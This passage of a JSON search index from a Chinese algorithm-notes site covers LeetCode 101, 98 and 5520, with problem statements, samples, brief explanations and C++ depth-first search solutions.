\u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/3.LeetCode_101_%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/3.LeetCode_101_%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/3.LeetCode_101_%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/#12-problem-description","text":"\u7ed9\u5b9a\u4e00\u4e2a\u4e8c\u53c9\u6811\uff0c\u68c0\u67e5\u5b83\u662f\u5426\u662f\u955c\u50cf\u5bf9\u79f0\u7684\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/3.LeetCode_101_%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/#15-sample-input-1","text":"\u4f8b\u5982\uff0c\u4e8c\u53c9\u6811 [1,2,2,3,4,4,3] \u662f\u5bf9\u79f0\u7684\u3002 1 / \\ 2 2 / \\ / \\ 3 4 4 3","title":"1.5. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/3.LeetCode_101_%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/#16-sample-output-1","text":"true","title":"1.6. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/3.LeetCode_101_%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/#15-sample-input-2","text":"\u4f46\u662f\u4e0b\u9762\u8fd9\u4e2a [1,2,2,null,3,null,3] \u5219\u4e0d\u662f\u955c\u50cf\u5bf9\u79f0\u7684: 1 / \\ 2 2 \\ \\ 3 3","title":"1.5. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/3.LeetCode_101_%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/#16-sample-output-2","text":"false","title":"1.6. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/3.LeetCode_101_%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/#18-source","text":"LeetCode 101 \u5bf9\u79f0\u4e8c\u53c9\u6811","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/3.LeetCode_101_%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/#2","text":"DFS\uff0c\u5148\u5224\u65ad\u8282\u70b9\u662f\u5426\u4e3a\u7a7a\uff0c\u7136\u540e\u5206\u522b\u6bd4\u8f83\u5de6\u53f3\u8282\u70b9\u7684\u503c\u662f\u5426\u76f8\u7b49\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u6839\u8282\u70b9\u4e3a\u7a7a\u65f6\u662f\u5bf9\u79f0\u7684\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/3.LeetCode_101_%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/#3","text":"class Solution { public: bool isNodeSymmetric(TreeNode* p, TreeNode* q) { bool leftFalg = false, rightFlag = false; // \u82e5\u5176\u4e00\u4e3a\u7a7a if (p == nullptr || q == nullptr) { // \u5224\u65ad\u662f\u5426\u90fd\u4e3a\u7a7a if (p == q) { return true; } else { return false; } } else { // \u82e5\u4e0d\u4e3a\u7a7a if (p->val != q->val) { // \u82e5\u503c\u4e0d\u76f8\u7b49\uff0c\u8fd4\u56defalse return false; } // \u82e5\u503c\u76f8\u7b49\uff0c\u7ee7\u7eed\u5224\u5b9a\u5de6\u53f3\u8282\u70b9 leftFalg = isNodeSymmetric(p->left, q->right); rightFlag = isNodeSymmetric(p->right, q->left); if (leftFalg && rightFlag) { return true; } else { return false; } } } bool isSymmetric(TreeNode* root) { if (root == nullptr){ return true; }else{ return isNodeSymmetric(root->left, root->right); } } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/4.LeetCode_98_%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/","text":"LeetCode 98 \u9a8c\u8bc1\u4e8c\u53c9\u641c\u7d22\u6811 # \u76ee\u5f55 # LeetCode 98 \u9a8c\u8bc1\u4e8c\u53c9\u641c\u7d22\u6811 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.5. Sample Input 1 1.6. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u7ed9\u5b9a\u4e00\u4e2a\u4e8c\u53c9\u6811\uff0c\u5224\u65ad\u5176\u662f\u5426\u662f\u4e00\u4e2a\u6709\u6548\u7684\u4e8c\u53c9\u641c\u7d22\u6811\u3002 \u5047\u8bbe\u4e00\u4e2a\u4e8c\u53c9\u641c\u7d22\u6811\u5177\u6709\u5982\u4e0b\u7279\u5f81\uff1a \u8282\u70b9\u7684\u5de6\u5b50\u6811\u53ea\u5305\u542b\u5c0f\u4e8e\u5f53\u524d\u8282\u70b9\u7684\u6570\u3002 \u8282\u70b9\u7684\u53f3\u5b50\u6811\u53ea\u5305\u542b\u5927\u4e8e\u5f53\u524d\u8282\u70b9\u7684\u6570\u3002 \u6240\u6709\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811\u81ea\u8eab\u5fc5\u987b\u4e5f\u662f\u4e8c\u53c9\u641c\u7d22\u6811\u3002 1.5. Sample Input 1 # \u8f93\u5165: 2 / \\ 1 3 1.6. Sample Output 1 # \u8f93\u51fa: true 1.5. Sample Input 2 # \u8f93\u5165: 5 / \\ 1 4 / \\ 3 6 1.6. Sample Output 2 # \u8f93\u51fa: false \u89e3\u91ca: \u8f93\u5165\u4e3a: [5,1,4,null,null,3,6] \u3002 \u6839\u8282\u70b9\u7684\u503c\u4e3a 5 \uff0c\u4f46\u662f\u5176\u53f3\u5b50\u8282\u70b9\u503c\u4e3a 4 \u3002 1.8. Source # LeetCode 98 \u9a8c\u8bc1\u4e8c\u53c9\u641c\u7d22\u6811 2. \u89e3\u8bfb # DFS\uff0c\u5148\u5224\u65ad\u8282\u70b9\u662f\u5426\u4e3a\u7a7a\uff0c\u7136\u540e\u5206\u522b\u6bd4\u8f83\u5de6\u53f3\u8282\u70b9\u7684\u503c\u3002\u9700\u8981\u6ce8\u610f\u5148\u5c06\u4e0a\u4e0b\u754c\u8bbe\u7f6e\u4e3a LONG_MIN \u548c LONG_MAX \u3002 \u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e2d\u5e8f\u904d\u5386\uff0c\u4e8c\u53c9\u641c\u7d22\u6811\u7684\u4e2d\u5e8f\u904d\u5386\u5e94\u8be5\u662f\u9012\u589e\u7684\uff0c\u5982\u679c\u51fa\u73b0\u975e\u9012\u589e\u5219\u8fd4\u56de False \u3002 \u4ee3\u7801\u53c2\u8003\u81ea \u5b98\u65b9\u9898\u89e3 \u3002 3. \u4ee3\u7801 # // DFS class Solution { public: bool isNodeBST(TreeNode* pre, long long lower, long long upper) { bool leftFalg = false, rightFalg = false; // \u904d\u5386\u5b8c\u6210 if (pre == nullptr) { return true; } // \u5982\u679c\u4e0d\u7b26\u5408\u6761\u4ef6\uff0c\u8fd4\u56deFalse if ( pre->val >= upper || pre->val <= lower) { return false; } // \u5224\u65ad\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811 leftFalg = isNodeBST(pre->left, lower, pre->val); rightFalg = isNodeBST(pre->right, pre->val, upper); if (leftFalg && rightFalg) { return true; } else { return false; } } bool isValidBST(TreeNode* root) { if (root == nullptr) { return true; } else { return isNodeBST(root, LONG_MIN, LONG_MAX); } } }; // \u4e2d\u5e8f\u904d\u5386 class Solution { public: long long maxNode = LONG_MIN; bool isValidBST(TreeNode* root) { bool leftFlag = 0, rightFlag = 0; if (root == nullptr) { return true; } else { // \u5224\u65ad\u5de6\u5b50\u6811 leftFlag = isValidBST(root->left); // \u5224\u65ad\u662f\u5426\u5347\u5e8f if (root->val > maxNode) { maxNode = root->val; } else { return false; } // \u5224\u65ad\u53f3\u5b50\u6811 rightFlag = isValidBST(root->right); } if (leftFlag && rightFlag) { return true; } else { return false; } } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.LeetCode 98 \u9a8c\u8bc1\u4e8c\u53c9\u641c\u7d22\u6811"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/4.LeetCode_98_%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/#leetcode-98","text":"","title":"LeetCode 98 \u9a8c\u8bc1\u4e8c\u53c9\u641c\u7d22\u6811"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/4.LeetCode_98_%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/#_1","text":"LeetCode 98 \u9a8c\u8bc1\u4e8c\u53c9\u641c\u7d22\u6811 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.5. Sample Input 1 1.6. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/4.LeetCode_98_%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/4.LeetCode_98_%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/4.LeetCode_98_%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/#12-problem-description","text":"\u7ed9\u5b9a\u4e00\u4e2a\u4e8c\u53c9\u6811\uff0c\u5224\u65ad\u5176\u662f\u5426\u662f\u4e00\u4e2a\u6709\u6548\u7684\u4e8c\u53c9\u641c\u7d22\u6811\u3002 \u5047\u8bbe\u4e00\u4e2a\u4e8c\u53c9\u641c\u7d22\u6811\u5177\u6709\u5982\u4e0b\u7279\u5f81\uff1a \u8282\u70b9\u7684\u5de6\u5b50\u6811\u53ea\u5305\u542b\u5c0f\u4e8e\u5f53\u524d\u8282\u70b9\u7684\u6570\u3002 \u8282\u70b9\u7684\u53f3\u5b50\u6811\u53ea\u5305\u542b\u5927\u4e8e\u5f53\u524d\u8282\u70b9\u7684\u6570\u3002 \u6240\u6709\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811\u81ea\u8eab\u5fc5\u987b\u4e5f\u662f\u4e8c\u53c9\u641c\u7d22\u6811\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/4.LeetCode_98_%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/#15-sample-input-1","text":"\u8f93\u5165: 2 / \\ 1 3","title":"1.5. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/4.LeetCode_98_%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/#16-sample-output-1","text":"\u8f93\u51fa: true","title":"1.6. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/4.LeetCode_98_%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/#15-sample-input-2","text":"\u8f93\u5165: 5 / \\ 1 4 / \\ 3 6","title":"1.5. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/4.LeetCode_98_%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/#16-sample-output-2","text":"\u8f93\u51fa: false \u89e3\u91ca: \u8f93\u5165\u4e3a: [5,1,4,null,null,3,6] \u3002 \u6839\u8282\u70b9\u7684\u503c\u4e3a 5 \uff0c\u4f46\u662f\u5176\u53f3\u5b50\u8282\u70b9\u503c\u4e3a 4 \u3002","title":"1.6. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/4.LeetCode_98_%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/#18-source","text":"LeetCode 98 \u9a8c\u8bc1\u4e8c\u53c9\u641c\u7d22\u6811","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/4.LeetCode_98_%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/#2","text":"DFS\uff0c\u5148\u5224\u65ad\u8282\u70b9\u662f\u5426\u4e3a\u7a7a\uff0c\u7136\u540e\u5206\u522b\u6bd4\u8f83\u5de6\u53f3\u8282\u70b9\u7684\u503c\u3002\u9700\u8981\u6ce8\u610f\u5148\u5c06\u4e0a\u4e0b\u754c\u8bbe\u7f6e\u4e3a LONG_MIN \u548c LONG_MAX \u3002 \u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e2d\u5e8f\u904d\u5386\uff0c\u4e8c\u53c9\u641c\u7d22\u6811\u7684\u4e2d\u5e8f\u904d\u5386\u5e94\u8be5\u662f\u9012\u589e\u7684\uff0c\u5982\u679c\u51fa\u73b0\u975e\u9012\u589e\u5219\u8fd4\u56de False \u3002 \u4ee3\u7801\u53c2\u8003\u81ea \u5b98\u65b9\u9898\u89e3 \u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/4.LeetCode_98_%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/#3","text":"// DFS class Solution { public: bool isNodeBST(TreeNode* pre, long long lower, long long upper) { bool leftFalg = false, rightFalg = false; // \u904d\u5386\u5b8c\u6210 if (pre == nullptr) { return true; } // \u5982\u679c\u4e0d\u7b26\u5408\u6761\u4ef6\uff0c\u8fd4\u56deFalse if ( pre->val >= upper || pre->val <= lower) { return false; } // \u5224\u65ad\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811 leftFalg = isNodeBST(pre->left, lower, pre->val); rightFalg = isNodeBST(pre->right, pre->val, upper); if (leftFalg && rightFalg) { return true; } else { return false; } } bool isValidBST(TreeNode* root) { if (root == nullptr) { return true; } else { return isNodeBST(root, LONG_MIN, LONG_MAX); } } }; // \u4e2d\u5e8f\u904d\u5386 class Solution { public: long long maxNode = LONG_MIN; bool isValidBST(TreeNode* root) { bool leftFlag = 0, rightFlag = 0; if (root == nullptr) { return true; } else { // \u5224\u65ad\u5de6\u5b50\u6811 leftFlag = isValidBST(root->left); // \u5224\u65ad\u662f\u5426\u5347\u5e8f if (root->val > maxNode) { maxNode = root->val; } else { return false; } // \u5224\u65ad\u53f3\u5b50\u6811 rightFlag = isValidBST(root->right); } if (leftFlag && rightFlag) { return true; } else { return false; } } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/5.LeetCode_5520_%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%BF%E5%94%AF%E4%B8%80%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%95%B0%E7%9B%AE%E6%9C%80%E5%A4%A7/","text":"LeetCode 5520 \u62c6\u5206\u5b57\u7b26\u4e32\u4f7f\u552f\u4e00\u5b50\u5b57\u7b26\u4e32\u7684\u6570\u76ee\u6700\u5927 # \u76ee\u5f55 # LeetCode 5520 \u62c6\u5206\u5b57\u7b26\u4e32\u4f7f\u552f\u4e00\u5b50\u5b57\u7b26\u4e32\u7684\u6570\u76ee\u6700\u5927 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u7ed9\u4f60\u4e00\u4e2a\u5b57\u7b26\u4e32 s \uff0c\u8bf7\u4f60\u62c6\u5206\u8be5\u5b57\u7b26\u4e32\uff0c\u5e76\u8fd4\u56de\u62c6\u5206\u540e\u552f\u4e00\u5b50\u5b57\u7b26\u4e32\u7684\u6700\u5927\u6570\u76ee\u3002 \u5b57\u7b26\u4e32 s \u62c6\u5206\u540e\u53ef\u4ee5\u5f97\u5230\u82e5\u5e72 \u975e\u7a7a\u5b50\u5b57\u7b26\u4e32 \uff0c\u8fd9\u4e9b\u5b50\u5b57\u7b26\u4e32\u8fde\u63a5\u540e\u5e94\u5f53\u80fd\u591f\u8fd8\u539f\u4e3a\u539f\u5b57\u7b26\u4e32\u3002\u4f46\u662f\u62c6\u5206\u51fa\u6765\u7684\u6bcf\u4e2a\u5b50\u5b57\u7b26\u4e32\u90fd\u5fc5\u987b\u662f \u552f\u4e00\u7684 \u3002 \u6ce8\u610f\uff1a \u5b50\u5b57\u7b26\u4e32 \u662f\u5b57\u7b26\u4e32\u4e2d\u7684\u4e00\u4e2a\u8fde\u7eed\u5b57\u7b26\u5e8f\u5217\u3002 1.3. Sample Input 1 # \u8f93\u5165\uff1as = \"ababccc\" 1.4. Sample Output 1 # \u8f93\u51fa\uff1a5 \u89e3\u91ca\uff1a\u4e00\u79cd\u6700\u5927\u62c6\u5206\u65b9\u6cd5\u4e3a ['a', 'b', 'ab', 'c', 'cc'] \u3002\u50cf ['a', 'b', 'a', 'b', 'c', 'cc'] \u8fd9\u6837\u62c6\u5206\u4e0d\u6ee1\u8db3\u9898\u76ee\u8981\u6c42\uff0c\u56e0\u4e3a\u5176\u4e2d\u7684 'a' \u548c 'b' \u90fd\u51fa\u73b0\u4e86\u4e0d\u6b62\u4e00\u6b21\u3002 1.5. Sample Input 2 # \u8f93\u5165\uff1as = \"aba\" 1.6. Sample Output 2 # \u8f93\u51fa\uff1a2 \u89e3\u91ca\uff1a\u4e00\u79cd\u6700\u5927\u62c6\u5206\u65b9\u6cd5\u4e3a ['a', 'ba'] \u3002 1.7. Source # LeetCode 5520 \u62c6\u5206\u5b57\u7b26\u4e32\u4f7f\u552f\u4e00\u5b50\u5b57\u7b26\u4e32\u7684\u6570\u76ee\u6700\u5927 2. \u89e3\u8bfb # DFS\u904d\u5386\u6240\u6709\u957f\u5ea6\u3002 3. \u4ee3\u7801 # class Solution { public: unordered_set<string> st; int ans = 0; int DFS(string& str, size_t pos) { // \u505c\u6b62\u641c\u7d22 if (pos >= str.size()) { return st.size(); } // \u904d\u5386\u6240\u6709\u957f\u5ea6 for (size_t i = 1; i <= str.size() - pos; i++) { // \u82e5\u672a\u5728\u96c6\u5408\u4e2d\u5b58\u50a8 if (st.find(str.substr(pos, i)) == st.end()) { // \u63d2\u5165\u96c6\u5408 st.insert(str.substr(pos, i)); // \u641c\u7d22\u4e0b\u4e00\u5b57\u7b26 ans = max(ans, DFS(str, pos + i)); // \u5c06\u5b57\u7b26\u4e32\u4ece\u96c6\u5408\u4e2d\u5220\u9664\uff0c\u9000\u56de\u4e0a\u4e00\u72b6\u6001 st.erase(str.substr(pos, i)); } } return ans; } int maxUniqueSplit(string s) { return DFS(s, 0); } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5.LeetCode 5520 \u62c6\u5206\u5b57\u7b26\u4e32\u4f7f\u552f\u4e00\u5b50\u5b57\u7b26\u4e32\u7684\u6570\u76ee\u6700\u5927"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/5.LeetCode_5520_%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%BF%E5%94%AF%E4%B8%80%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%95%B0%E7%9B%AE%E6%9C%80%E5%A4%A7/#leetcode-5520","text":"","title":"LeetCode 5520 \u62c6\u5206\u5b57\u7b26\u4e32\u4f7f\u552f\u4e00\u5b50\u5b57\u7b26\u4e32\u7684\u6570\u76ee\u6700\u5927"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/5.LeetCode_5520_%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%BF%E5%94%AF%E4%B8%80%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%95%B0%E7%9B%AE%E6%9C%80%E5%A4%A7/#_1","text":"LeetCode 5520 \u62c6\u5206\u5b57\u7b26\u4e32\u4f7f\u552f\u4e00\u5b50\u5b57\u7b26\u4e32\u7684\u6570\u76ee\u6700\u5927 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/5.LeetCode_5520_%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%BF%E5%94%AF%E4%B8%80%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%95%B0%E7%9B%AE%E6%9C%80%E5%A4%A7/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/5.LeetCode_5520_%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%BF%E5%94%AF%E4%B8%80%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%95%B0%E7%9B%AE%E6%9C%80%E5%A4%A7/#11-limit","text":"Time Limit: 2000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/DFS/5.LeetCode_5520_%E6%8B%86%E5%88%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%BF%E5%94%AF%E4%B8%80%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%95%B0%E7%9B%AE%E6%9C%80%E5%A4%A7/#12-problem-description","text":"\u7ed9\u4f60\u4e00\u4e2a\u5b57\u7b26\u4e32 s \uff0c\u8bf7\u4f60\u62c6\u5206\u8be5\u5b57\u7b26\u4e32\uff0c\u5e76\u8fd4\u56de\u62c6\u5206\u540e\u552f\u4e00\u5b50\u5b57\u7b26\u4e32\u7684\u6700\u5927\u6570\u76ee\u3002 \u5b57\u7b26\u4e32 s \u62c6\u5206\u540e\u53ef\u4ee5\u5f97\u5230\u82e5\u5e72 \u975e\u7a7a\u5b50\u5b57\u7b26\u4e32 